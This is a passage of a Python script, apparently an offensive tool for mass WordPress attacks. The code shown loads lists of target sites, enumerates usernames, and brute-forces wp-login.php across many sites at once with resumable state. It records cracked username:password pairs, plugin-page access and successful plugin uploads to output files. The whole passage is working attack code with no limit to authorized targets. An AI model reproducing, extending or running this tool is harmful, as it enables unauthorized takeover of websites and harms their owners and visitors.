        login_path = find_working_login_path(normalized_url, args.timeout)
        if not login_path:
            # Allow manual path override if detection fails
            print_status(f"No login path automatically detected for {normalized_url}.", "warning")
            print_status(f"Trying default /wp-login.php path anyway...", "info")
            login_path = "/wp-login.php"  # Use default path as fallback

        usernames = enumerate_usernames(normalized_url, args.timeout, args.delay, common_users)

        if not usernames:
            print_status(f"No usernames found to brute force on {normalized_url}. Skipping.", "warning")
            targets_completed.add(normalized_url)
            if args.state_file:
                save_state(args.state_file, targets_completed, [], None, None)
            return []

        if args.only_enumerate:
            print_status(f"Username enumeration completed for {normalized_url}. Skipping brute force as requested.", "info")
            targets_completed.add(normalized_url)
            if args.state_file:
                save_state(args.state_file, targets_completed, [], None, None)
            return []

        results = brute_force_users(
            normalized_url, login_path, usernames, args.timeout, args.workers, 
            args.verbose, args.output, args.delay, 
            args.state_file if args.resume else None,
            args.max_login_attempts, common_passwords
        )
        targets_completed.add(normalized_url)
        
        # Update state after completion
        if args.state_file:
            save_state(args.state_file, targets_completed, [], None, None)
            
        return results

    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        
        # Wait after failure to avoid rate limiting
        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
        time.sleep(args.fail_timeout)
        
        return []

async def async_process_url_list(url_list_file, args):
    """Process multiple WordPress sites from a URL list file using asyncio"""
    # Load state if resuming
    state = {'targets_completed': set(), 'targets_to_process': []}
    if args.resume:
        state = load_state(args.state_file)
    
    # Load URLs
    if not state['targets_to_process']:
        try:
            with open(url_list_file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                state['targets_to_process'] = urls
        except Exception as e:
            print_status(f"Error reading URL list file: {str(e)}", "error")
            sys.exit(1)

    # Filter out already completed targets
    urls_to_process = [url for url in state['targets_to_process'] if normalize_url(url) not in state['targets_completed']]
    
    # Resume from current URL if available
    current_idx = 0
    if state.get('current_url') and state['current_url'] in urls_to_process:
        try:
            current_idx = urls_to_process.index(state['current_url'])
            urls_to_process = urls_to_process[current_idx:]
        except ValueError:
            # Current URL not found in list, start from beginning
            pass

    print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
    print_status(f"Already completed: {len(state['targets_completed'])} URLs")
    
    # Create output files with header based on mode
    if args.mode == 1:
        # Mode 1: Initialize default brute force output
        if not os.path.exists(args.default_output):
            with open(args.default_output, 'w') as f:
                f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
        print_status(f"Running Mode 1: Fast admin brute force on {len(urls_to_process)} URLs", "info")
    else:
        # Mode 2: Initialize full enumeration output files
        if not args.resume or not os.path.exists(args.output):
            with open(args.output, 'w') as f:
                f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password\n")
                f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
        
        # Create plugin upload output file with header if not resuming
        if not args.resume or not os.path.exists(args.upload_output):
            with open(args.upload_output, 'w') as f:
                f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
        print_status(f"Running Mode 2: Full enumeration + brute force on {len(urls_to_process)} URLs", "info")

    # Process URLs with limited concurrency
    sem = asyncio.Semaphore(args.site_workers)
    
    async def process_url_with_semaphore(url):
        async with sem:
            # Update current URL in state
            if args.state_file:
                save_state(args.state_file, state['targets_completed'], urls_to_process, None, url)
                
            try:
                if args.mode == 1:
                    # Mode 1: Fast admin brute force
                    return await async_process_single_site_mode1(url, args)
                else:
                    # Mode 2: Full enumeration + brute force
                    return await async_process_single_site(url, args, state['targets_completed'])
            except Exception as e:
                print_status(f"Error processing URL {url}: {str(e)}", "error")
                return []
    
    # Create tasks for all URLs
    tasks = [process_url_with_semaphore(url) for url in urls_to_process]
    
    # Execute all tasks and gather results
    try:
        all_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        all_successful_logins = []
        for result in all_results:
            if isinstance(result, list):
                all_successful_logins.extend(result)
    except KeyboardInterrupt:
        print_status("\nOperation interrupted. State saved for resuming later.", "warning")
        if args.state_file:
            save_state(args.state_file, state['targets_completed'], urls_to_process, None, urls_to_process[0] if urls_to_process else None)
        sys.exit(1)

    # Final summary
    print_status(f"\n{'='*50}")
    print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
    print_status(f"Results saved to {args.output}")
    print_status(f"{'='*50}")

def process_url_list(url_list_file, args):
    """Process multiple WordPress sites from a URL list file"""
    # Load state if resuming
    state = {'targets_completed': set(), 'targets_to_process': []}
    if args.resume:
        state = load_state(args.state_file)
    
    # Load URLs
    if not state['targets_to_process']:
        try:
            with open(url_list_file, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
                state['targets_to_process'] = urls
        except Exception as e:
            print_status(f"Error reading URL list file: {str(e)}", "error")
            sys.exit(1)

    # Filter out already completed targets
    urls_to_process = [url for url in state['targets_to_process'] if normalize_url(url) not in state['targets_completed']]
    
    # Resume from current URL if available
    current_idx = 0
    if state.get('current_url') and state['current_url'] in urls_to_process:
        try:
            current_idx = urls_to_process.index(state['current_url'])
            urls_to_process = urls_to_process[current_idx:]
        except ValueError:
            # Current URL not found in list, start from beginning
            pass

    print_status(f"Loaded {len(urls_to_process)} URLs to process from {url_list_file}")
    print_status(f"Already completed: {len(state['targets_completed'])} URLs")

    # Create output files with header based on mode
    if args.mode == 1:
        # Mode 1: Initialize default brute force output
        if not os.path.exists(args.default_output):
            with open(args.default_output, 'w') as f:
                f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
        print_status(f"Running Mode 1: Fast admin brute force on {len(urls_to_process)} URLs", "info")
    else:
        # Mode 2: Initialize full enumeration output files
        if not args.resume or not os.path.exists(args.output):
            with open(args.output, 'w') as f:
                f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password\n")
                f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
        
        # Create plugin upload output file with header if not resuming
        if not args.resume or not os.path.exists(args.upload_output):
            with open(args.upload_output, 'w') as f:
                f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")
        print_status(f"Running Mode 2: Full enumeration + brute force on {len(urls_to_process)} URLs", "info")

    # Process URLs with ThreadPoolExecutor for concurrency
    all_successful_logins = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.site_workers) as executor:
        # Create a queue for URLs to process
        url_queue = queue.Queue()
        for url in urls_to_process:
            url_queue.put(url)
        
        # Create futures for initial batch of sites
        futures = {}
        for _ in range(min(args.site_workers, len(urls_to_process))):
            if url_queue.empty():
                break
            url = url_queue.get()
            if args.mode == 1:
                future = executor.submit(process_single_site_mode1, url, args)
            else:
                future = executor.submit(process_single_site, url, args, state['targets_completed'])
            futures[future] = url
        
        # Process results as they complete and add new tasks
        while futures:
            # Wait for the next future to complete
            done, _ = concurrent.futures.wait(
                futures, return_when=concurrent.futures.FIRST_COMPLETED
            )
            
            for future in done:
                url = futures.pop(future)
                try:
                    # Process the result
                    result = future.result()
                    all_successful_logins.extend(result)
                    
                    # Add new URL to process if available
                    if not url_queue.empty():
                        new_url = url_queue.get()
                        if args.mode == 1:
                            new_future = executor.submit(process_single_site_mode1, new_url, args)
                        else:
                            new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
                        futures[new_future] = new_url
                except KeyboardInterrupt:
                    print_status("\nOperation interrupted. State saved for resuming later.", "warning")
                    if args.state_file:
                        save_state(args.state_file, state['targets_completed'], list(url_queue.queue), None, url)
                    executor.shutdown(wait=False, cancel_futures=True)
                    sys.exit(1)
                except Exception as e:
                    print_status(f"Error processing URL {url}: {str(e)}", "error")
                    
                    # Add new URL to process if available
                    if not url_queue.empty():
                        new_url = url_queue.get()
                        if args.mode == 1:
                            new_future = executor.submit(process_single_site_mode1, new_url, args)
                        else:
                            new_future = executor.submit(process_single_site, new_url, args, state['targets_completed'])
                        futures[new_future] = new_url

    # Final summary
    print_status(f"\n{'='*50}")
    print_status(f"SCAN COMPLETE - {len(all_successful_logins)} successful logins found", "success")
    print_status(f"Results saved to {args.output}")
    print_status(f"{'='*50}")

async def async_main():
    """Main function using asyncio"""
    args = parse_args()

    try:
        # Create output directory if it doesn't exist
        output_dir = os.path.dirname(args.output)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)

        if args.url_list:
            await async_process_url_list(args.url_list, args)
        else:
            # Single target processing
            normalized_url = normalize_url(args.target)
            
            if args.mode == 1:
                # Mode 1: Fast admin-only brute force
                print_status(f"Running Mode 1: Fast admin brute force on {normalized_url}", "info")
                
                # Initialize default brute force output file
                if not os.path.exists(args.default_output):
                    with open(args.default_output, 'w') as f:
                        f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
                
                successful_logins = await async_process_single_site_mode1(args.target, args)
                
                if successful_logins:
                    print_status(f"\n{'='*50}")
                    print_status(f"SUMMARY - Fast admin brute force results for {normalized_url}:", "success")
                    for login in successful_logins:
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                    print_status(f"Results saved to {args.default_output}")
                    print_status(f"{'='*50}")
            else:
                # Mode 2: Full enumeration + brute force (existing functionality)
                print_status(f"Running Mode 2: Full enumeration + brute force on {normalized_url}", "info")
                
                # Check if we're resuming
                targets_completed = set()
                if args.resume:
                    state = load_state(args.state_file)
                    targets_completed = state['targets_completed']
                
                # Initialize output file if not resuming
                if not args.resume or not os.path.exists(args.output):
                    with open(args.output, 'w') as f:
                        f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password\n")
                        f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
                
                # Initialize plugin upload output file
                if not args.resume or not os.path.exists(args.upload_output):
                    with open(args.upload_output, 'w') as f:
                        f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")

                successful_logins = await async_process_single_site(args.target, args, targets_completed)

                if successful_logins and not args.only_enumerate:
                    print_status(f"\n{'='*50}")
                    print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
                    for login in successful_logins:
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                    print_status(f"Results saved to {args.output}")
                    print_status(f"{'='*50}")

    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user. Saving state for resuming later.", "warning")
        if args.state_file:
            save_state(args.state_file, set(), [args.target], None, args.target)
        sys.exit(1)
    except Exception as e:
        print_status(f"An unexpected error occurred: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()

def main():
    """Main function using synchronous processing"""
    args = parse_args()

    # Use asyncio if requested
    if args.use_async:
        asyncio.run(async_main())
        return

    try:
        # Create output directory if it doesn't exist
        output_dir = os.path.dirname(args.output)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)

        if args.url_list:
            process_url_list(args.url_list, args)
        else:
            # Single target processing
            normalized_url = normalize_url(args.target)
            
            if args.mode == 1:
                # Mode 1: Fast admin-only brute force
                print_status(f"Running Mode 1: Fast admin brute force on {normalized_url}", "info")
                
                # Initialize default brute force output file
                if not os.path.exists(args.default_output):
                    with open(args.default_output, 'w') as f:
                        f.write(f"# WordPress Admin Brute Force Results - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password - Method\n\n")
                
                successful_logins = process_single_site_mode1(args.target, args)
                
                if successful_logins:
                    print_status(f"\n{'='*50}")
                    print_status(f"SUMMARY - Fast admin brute force results for {normalized_url}:", "success")
                    for login in successful_logins:
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                    print_status(f"Results saved to {args.default_output}")
                    print_status(f"{'='*50}")
            else:
                # Mode 2: Full enumeration + brute force (existing functionality)
                print_status(f"Running Mode 2: Full enumeration + brute force on {normalized_url}", "info")
                
                # Check if we're resuming
                targets_completed = set()
                if args.resume:
                    state = load_state(args.state_file)
                    targets_completed = state['targets_completed']
                
                # Initialize output file if not resuming
                if not args.resume or not os.path.exists(args.output):
                    with open(args.output, 'w') as f:
                        f.write(f"# WordPress Successful Logins - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password\n")
                        f.write("# Format: [Timestamp] URL - username:password - Plugin Access: plugins.php, plugin-install.php, ...\n\n")
                
                # Initialize plugin upload output file
                if not args.resume or not os.path.exists(args.upload_output):
                    with open(args.upload_output, 'w') as f:
                        f.write(f"# WordPress Plugin Upload Successes - Started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                        f.write("# Format: [Timestamp] URL - username:password - Upload Method - Plugin URL\n\n")

                successful_logins = process_single_site(args.target, args, targets_completed)

                if successful_logins and not args.only_enumerate:
                    print_status(f"\n{'='*50}")
                    print_status(f"SUMMARY - Successful logins for {normalized_url}:", "success")
                    for login in successful_logins:
                        print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {normalized_url} - {login}")
                    print_status(f"Results saved to {args.output}")
                    print_status(f"{'='*50}")

    except KeyboardInterrupt:
        print_status("\nOperation cancelled by user. Saving state for resuming later.", "warning")
        if args.state_file:
            save_state(args.state_file, set(), [args.target], None, args.target)
        sys.exit(1)
    except Exception as e:
        print_status(f"An unexpected error occurred: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == '__main__':
    main()
